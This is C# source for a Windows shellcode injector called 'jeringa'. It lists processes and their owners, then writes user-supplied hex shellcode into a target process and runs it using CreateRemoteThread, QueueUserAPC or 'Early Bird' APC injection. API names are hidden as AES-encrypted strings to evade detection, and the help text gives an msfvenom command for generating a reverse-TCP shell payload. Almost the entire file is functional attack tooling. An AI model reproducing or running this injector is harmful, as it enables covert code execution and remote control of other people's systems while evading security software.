using System;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.Security.Principal;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;

namespace jeringa
{
    class Program
    {
        /*
        // [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        // [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        // [DllImport("advapi32.dll", SetLastError = true)] private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        // [DllImport("kernel32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)] private static extern bool CloseHandle(IntPtr hObject);      
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        // [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")] static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")] public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        [DllImport("kernel32.dll", SetLastError = true)] static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        // [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        // [DllImport("kernel32.dll")] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        // [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        // [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
        // [DllImport("kernel32.dll")] public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, uint dwData);
        // [DllImport("kernel32.dll")] public static extern uint ResumeThread(IntPtr hThread);
        // [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        // [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        // [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        // [DllImport("kernel32.dll")] public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, uint dwData);
        // [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
         */

        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1); // [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId); static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
        [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
        [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
        [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

        delegate IntPtr OpenProcessDelegate(uint processAccess, bool bInheritHandle, int processId);
        delegate bool OpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        delegate bool CloseHandleDelegate(IntPtr hObject);
        delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        delegate uint QueueUserAPCDelegate(IntPtr pfnAPC, IntPtr hThread, uint dwData);
        delegate uint ResumeThreadDelegate(IntPtr hThread);
        delegate IntPtr OpenThreadDelegate(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        static String EncryptStringToBytes(string plainText, byte[] Key, byte[] IV)
        {
            // Check arguments. 
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] encrypted;
            // Create an RijndaelManaged object 
            // with the specified key and IV. 
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;

                // Create a decryptor to perform the stream transform.
                ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);

                // Create the streams used for encryption. 
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {

                            //Write all data to the stream.
                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }


            // Return the encrypted bytes from the memory stream. 
            return Convert.ToBase64String(encrypted);

        }

        static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
        {
            byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
            // Check arguments. 
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");

            // Declare the string used to hold 
            // the decrypted text. 
            string plaintext = null;

            // Create an RijndaelManaged object 
            // with the specified key and IV. 
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;

                // Create a decrytor to perform the stream transform.
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);

                // Create the streams used for decryption. 
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {

                            // Read the decrypted bytes from the decrypting stream 
                            // and place them in a string.
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }

            }

            return plaintext;

        }
        private static string getProcessOwner(Process process)
        {
            IntPtr processHandle = IntPtr.Zero;
            try
            {
                // Delegates 
                IntPtr a32 = GetModuleHandle("advapi32.dll");
                IntPtr addrOpenProcessToken = GetProcAddress(a32, "OpenProcessToken");
                OpenProcessTokenDelegate auxOpenProcessToken = (OpenProcessTokenDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcessToken, typeof(OpenProcessTokenDelegate));
                auxOpenProcessToken(process.Handle, 8, out processHandle);
                WindowsIdentity wi = new WindowsIdentity(processHandle);
                string user = wi.Name;
                return user;
            }
            catch
            {
                return "N/A";
            }
            finally
            {
                if (processHandle != IntPtr.Zero)
                {
                    // Delegates 
                    IntPtr k32 = GetModuleHandle("kernel32.dll");
                    IntPtr addrCloseHandle = GetProcAddress(k32, "CloseHandle");
                    CloseHandleDelegate auxCloseHandle = (CloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(addrCloseHandle, typeof(CloseHandleDelegate));
                    auxCloseHandle(processHandle);
                }
            }
        }

        static Dictionary<string, string> getProcessPids(String process_name)
        {
            Dictionary<string, string> user_pid = new Dictionary<string, string>();
            Process[] processCollection = { };
            if (process_name == "all")
            {
                processCollection = Process.GetProcesses();
                foreach (Process targetProcess in processCollection)
                {
                    String processOwner = getProcessOwner(targetProcess);
                    String pid = targetProcess.Id.ToString();
                    user_pid.Add(pid, processOwner);
                }
            }
            else
            {
                processCollection = Process.GetProcesses();
                foreach (Process targetProcess in processCollection)
                {
                    String processOwner = getProcessOwner(targetProcess);
                    if ((targetProcess.ProcessName.ToLower() == process_name.ToLower()) || (processOwner.ToLower().Contains(process_name.ToLower())))
                    {
                        String pid = targetProcess.Id.ToString();
                        user_pid.Add(pid, processOwner);
                    }
                }
            }

            return user_pid;
        }

        public static byte[] ToByteArray(String hexString)
        {
            byte[] retval = new byte[hexString.Length / 2];
            for (int i = 0; i < hexString.Length; i += 2)
                retval[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
            return retval;
        }


        static void injectShellcodeCreateRemoteThread(String processPID, String payload)
        {
            // Delegates 
            IntPtr k32 = GetModuleHandle("kernel32.dll");

            RijndaelManaged myRijndael = new RijndaelManaged();
            String password = "ricardojoserf   ";
            String iv = "jeringa jeringa ";

            // String encrypted = EncryptStringToBytes("QueueUserAPC", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            // Console.WriteLine(encrypted);

            String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedCreateRemoteThread = DecryptStringFromBytes("EcLQmi+4wHc4weGwjNgqCQe+1LyC2VMgE3xKs7JyhZY=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));

            IntPtr addrOpenProcess = GetProcAddress(k32, decryptedOpenProcess);
            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
            IntPtr addrCreateRemoteThread = GetProcAddress(k32, decryptedCreateRemoteThread);
            
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            CreateRemoteThreadDelegate auxCreateRemoteThread = (CreateRemoteThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateRemoteThread, typeof(CreateRemoteThreadDelegate));

            // Create handle to the process
            // We need (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION), we can get the values from https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
            String processname = Process.GetProcessById(Int32.Parse(processPID)).ProcessName;
            uint processRights = 0x0010 | 0x0400;
            IntPtr processHandle = auxOpenProcess(processRights, false, Int32.Parse(processPID));
            if (processHandle != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process {0} ({1}) created correctly.", processPID, processname);
            }
            else
            {
                Console.WriteLine("[-] Error: Handle to process {0} ({1}) is NULL.", processPID, processname);
            }

            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int16.Parse(processPID));
            IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            if (payload == null)
            {
                byte[] inputBuffer = new byte[1024];
                Stream inputStream = Console.OpenStandardInput(inputBuffer.Length);
                Console.SetIn(new StreamReader(inputStream, Console.InputEncoding, false, inputBuffer.Length));
                Console.WriteLine("[+] Write hexadecimal payload or url (or Enter to exit):");
                payload = Console.ReadLine();
            }

            byte[] buf = { };
            if (payload == "")
            {
                Console.WriteLine("[-] Exiting...");
                System.Environment.Exit(0);
            }
            // else check url
            ///// 

            // else hexadecimal 
            else
            {
                buf = ToByteArray(payload);
            }

            IntPtr outSize;
            auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = auxCreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }


        static void injectShellcodeQueueUserAPC(String processPID, String payload)
        {

            // Delegates 
            IntPtr k32 = GetModuleHandle("kernel32.dll");

            RijndaelManaged myRijndael = new RijndaelManaged();
            String password = "ricardojoserf   ";
            String iv = "jeringa jeringa ";

            String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedQueueUserAPC = DecryptStringFromBytes("cd7xBomTOk7mvZ7UxBJDaQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedOpenThread = DecryptStringFromBytes("ATZJvFQXpEJm5R5ff90mOA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));

            IntPtr addrOpenProcess = GetProcAddress(k32, decryptedOpenProcess);
            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
            IntPtr addrQueueUserAPC = GetProcAddress(k32, decryptedQueueUserAPC);
            IntPtr addrOpenThread = GetProcAddress(k32, decryptedOpenThread);
            
            OpenProcessDelegate auxOpenProcess = (OpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenProcess, typeof(OpenProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            QueueUserAPCDelegate auxQueueUserAPC = (QueueUserAPCDelegate)Marshal.GetDelegateForFunctionPointer(addrQueueUserAPC, typeof(QueueUserAPCDelegate));
            OpenThreadDelegate auxOpenThread = (OpenThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrOpenThread, typeof(OpenThreadDelegate));


            if (payload == null)
            {
                byte[] inputBuffer = new byte[1024];
                Stream inputStream = Console.OpenStandardInput(inputBuffer.Length);
                Console.SetIn(new StreamReader(inputStream, Console.InputEncoding, false, inputBuffer.Length));
                Console.WriteLine("[+] Write hexadecimal payload or url (or Enter to exit):");
                payload = Console.ReadLine();
            }

            byte[] buf = { };
            if (payload == "")
            {
                Console.WriteLine("[-] Exiting...");
                System.Environment.Exit(0);
            }
            // else check url
            ///// 

            // else hexadecimal 
            else
            {
                buf = ToByteArray(payload);
            }

            String processname = Process.GetProcessById(Int32.Parse(processPID)).ProcessName;
            uint processRights = 0x0010 | 0x0400;
            IntPtr processHandle = auxOpenProcess(processRights, false, Int32.Parse(processPID));
            if (processHandle != INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[+] Handle to process {0} ({1}) created correctly.", processPID, processname);
            }
            else
            {
                Console.WriteLine("[-] Error: Handle to process {0} ({1}) is NULL.", processPID, processname);
            }

            IntPtr hProcess = auxOpenProcess(0x001F0FFF, false, Int16.Parse(processPID));           
            IntPtr addr = auxVirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000, 0x20); // 0x20: PAGE_EXECUTE_READ; 0x1000 = MEM_COMMIT
            auxWriteProcessMemory(hProcess, addr, buf, buf.Length, out _);
            // Console.WriteLine("VA:  " + addr.ToString("X"));
            ProcessThread hThread = Process.GetProcessById(Int16.Parse(processPID)).Threads[0];
            IntPtr hThreadId = auxOpenThread(0x0010, false, (uint)hThread.Id);
            auxQueueUserAPC(addr, hThreadId, 0);

            /*
            foreach (ProcessThread thread in Process.GetProcessById(Int16.Parse(processPID)).Threads)
            {
                IntPtr threadHandle = OpenThread(ThreadAccess.SET_CONTEXT, false, (uint)thread.Id);
                QueueUserAPC(addr, threadHandle, 0);
                Console.WriteLine("Thread ID: " + thread.Id + "   \tThread handle: " + threadHandle);
                
            }
            */
        }


        static void injectShellcodeEarlyBird(String processname, String payload)
        {
            // Delegates
            IntPtr k32 = GetModuleHandle("kernel32.dll");

            RijndaelManaged myRijndael = new RijndaelManaged();
            String password = "ricardojoserf   ";
            String iv = "jeringa jeringa ";

            String decryptedCreateProcessA = DecryptStringFromBytes("2FXtT/hu7ZEj8oz79680TQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedQueueUserAPC = DecryptStringFromBytes("cd7xBomTOk7mvZ7UxBJDaQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
            String decryptedResumeThread = DecryptStringFromBytes("uINo0LSuz3QttywZS2AsBw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));

            IntPtr addrCreateProcess = GetProcAddress(k32, decryptedCreateProcessA);
            IntPtr addrVirtualAllocEx = GetProcAddress(k32, decryptedVirtualAllocEx);
            IntPtr addrWriteProcessMemory = GetProcAddress(k32, decryptedWriteProcessMemory);
            IntPtr addrQueueUserAPC = GetProcAddress(k32, decryptedQueueUserAPC);
            IntPtr addrResumeThread = GetProcAddress(k32, decryptedResumeThread);

            CreateProcessDelegate auxCreateProcess = (CreateProcessDelegate)Marshal.GetDelegateForFunctionPointer(addrCreateProcess, typeof(CreateProcessDelegate));
            VirtualAllocExDelegate auxVirtualAllocEx = (VirtualAllocExDelegate)Marshal.GetDelegateForFunctionPointer(addrVirtualAllocEx, typeof(VirtualAllocExDelegate));
            WriteProcessMemoryDelegate auxWriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(addrWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
            QueueUserAPCDelegate auxQueueUserAPC = (QueueUserAPCDelegate)Marshal.GetDelegateForFunctionPointer(addrQueueUserAPC, typeof(QueueUserAPCDelegate));
            ResumeThreadDelegate auxResumeThread = (ResumeThreadDelegate)Marshal.GetDelegateForFunctionPointer(addrResumeThread, typeof(ResumeThreadDelegate));

            // https://www.codeproject.com/Articles/230005/Launch-a-process-suspended
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            var pi = new PROCESS_INFORMATION();

            // bool success = CreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            bool success = auxCreateProcess(processname, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);

            Console.WriteLine("[+] Trying to spawn a suspended process for "+processname);
            if (success)
            {
                Console.WriteLine("[+] Process created correctly");
            }
            else {
                Console.WriteLine("[-] Process failed to create");
                System.Environment.Exit(0);
            }

            Console.WriteLine("[+] Process PID: " + pi.dwProcessId);
            Console.WriteLine("[+] Thread ID:   " + pi.dwThreadId); 

            if (payload == null)
            {
                byte[] inputBuffer = new byte[1024];
                Stream inputStream = Console.OpenStandardInput(inputBuffer.Length);
                Console.SetIn(new StreamReader(inputStream, Console.InputEncoding, false, inputBuffer.Length));
                Console.WriteLine("[+] Write hexadecimal payload or url (or Enter to exit):");
                payload = Console.ReadLine();
            }

            byte[] buf = { };
            if (payload == "")
            {
                Console.WriteLine("[-] Exiting...");
                System.Environment.Exit(0);
            }
            // else check url
            ///// 

            // else hexadecimal 
            else
            {
                buf = ToByteArray(payload);
            }            

            var baseAddress = auxVirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x20);
            auxWriteProcessMemory(pi.hProcess, baseAddress, buf, buf.Length, out _);
            auxQueueUserAPC(baseAddress, pi.hThread, 0);
            auxResumeThread(pi.hThread);
        }

            static void listInfo(Dictionary<string, string> processPIDs)
        {
            Console.WriteLine("{0,40} | {1,10} | {2,20}", "Process Name", "PID", "Process Owner");
            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 80)));
            foreach (KeyValuePair<string, string> kvp in processPIDs)
            {
                //Console.WriteLine("Name = {0}\tPID = {1}\tUser = {2}", Process.GetProcessById(Int32.Parse(kvp.Key)).ProcessName, kvp.Key, kvp.Value);
                Console.WriteLine("{0,40} | {1,10} | {2,20}", Process.GetProcessById(Int32.Parse(kvp.Key)).ProcessName, kvp.Key, kvp.Value);
                // Console.WriteLine("[+] " + kvp.Value);
            }

        }

        static void getHelp()
        {
            Console.WriteLine("[+] List processes:");
            Console.WriteLine("Program.exe list all\n");

            Console.WriteLine("[+] List processes with a specific name (\"explorer\") or process owner (\"ricardo\"):");
            Console.WriteLine("Program.exe list explorer");
            Console.WriteLine("Program.exe list \"DESKTOP-MA54241\\ricardo\"\n");

            Console.WriteLine("[+] Inject using process name, process owner and optionally payload in HEX format (if not provided the program requests it):");
            Console.WriteLine("Program.exe inject explorer \"DESKTOP-MA54241\\ricardo\" [ fc4883e4f0e8... ]\n");

            Console.WriteLine("[+] Inject using PID (\"1234\") and optionally payload in HEX format (if not provided the program requests it):");
            Console.WriteLine("Program.exe inject 1234 [ fc4883e4f0e8... ]\n");

            Console.WriteLine("[+] NOTE: You can use your own shellcode or create one in the expected format with Msfvenom:");
            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\\x' | tr -d '\"\\n\\\\x;'\n");

            System.Environment.Exit(0);
        }

        static void Main(string[] args)
        {

            // Check we are running an elevated process
            /*
             * if (WindowsIdentity.GetCurrent().Owner
                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
            {
                Console.WriteLine("[-] Error: Execute with administrative privileges.");
                return;
            }
            */

            if (args.Length < 2)
            {
                getHelp();
            }

            string option = args[0];
            string process_str = args[1];

            

            /*
            using (RijndaelManaged myRijndael = new RijndaelManaged())
            {

                // myRijndael.GenerateKey();
                String password = "ricardojoserf-je";
                myRijndael.GenerateIV();
                // Encrypt the string to an array of bytes. 
                // byte[] encrypted = EncryptStringToBytes("openProcess", myRijndael.Key, myRijndael.IV);
                String encrypted = EncryptStringToBytes("openProcess", Encoding.ASCII.GetBytes(password), myRijndael.IV);
                // Decrypt the bytes to a string. 
                // string roundtrip = DecryptStringFromBytes(encrypted, myRijndael.Key, myRijndael.IV);
                String roundtrip = DecryptStringFromBytes(encrypted, Encoding.ASCII.GetBytes(password), myRijndael.IV);
                //Display the original data and the decrypted data.
                Console.WriteLine("Original:   {0}", "openProcess");
                Console.WriteLine("Encrypted:  {0}", encrypted);
                Console.WriteLine("Round Trip: {0}", roundtrip);

            }
            */

            if (option == "list")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                listInfo(processPIDs);
                
            }

            else if (option == "inject-crt")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                var isNumeric = int.TryParse(process_str, out int n);
                if (isNumeric)
                {
                    string payload;
                    if (args.Length == 3)
                    {
                        payload = args[2];
                    }
                    else
                    {
                        payload = null;
                    }
                    injectShellcodeCreateRemoteThread(process_str, payload);
                }
                else
                {
                    string username_str = args[2];
                    string payload;
                    if (args.Length == 4)
                    {
                        payload = args[3];
                    }
                    else
                    {
                        payload = null;
                    }

                    foreach (KeyValuePair<string, string> kvp in processPIDs)
                    {
                        if (kvp.Value == username_str)
                        {
                            injectShellcodeCreateRemoteThread(kvp.Key, payload);
                            break;
                        }
                    }
                }
            }

            else if (option == "inject-apc")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                var isNumeric = int.TryParse(process_str, out int n);
                if (isNumeric)
                {
                    string payload;
                    if (args.Length == 3)
                    {
                        payload = args[2];
                    }
                    else
                    {
                        payload = null;
                    }
                    injectShellcodeQueueUserAPC(process_str, payload);
                }
                else
                {
                    string username_str = args[2];
                    string payload;
                    if (args.Length == 4)
                    {
                        payload = args[3];
                    }
                    else
                    {
                        payload = null;
                    }

                    foreach (KeyValuePair<string, string> kvp in processPIDs)
                    {
                        if (kvp.Value == username_str)
                        {
                            injectShellcodeQueueUserAPC(kvp.Key, payload);
                            break;
                        }
                    }
                }
            }

            else if (option == "earlybird")
            {
                string payload;
                if (args.Length == 3)
                {
                    payload = args[2];
                }
                else
                {
                    payload = null;
                }
                injectShellcodeEarlyBird(process_str, payload);
            }
        }
    }
}
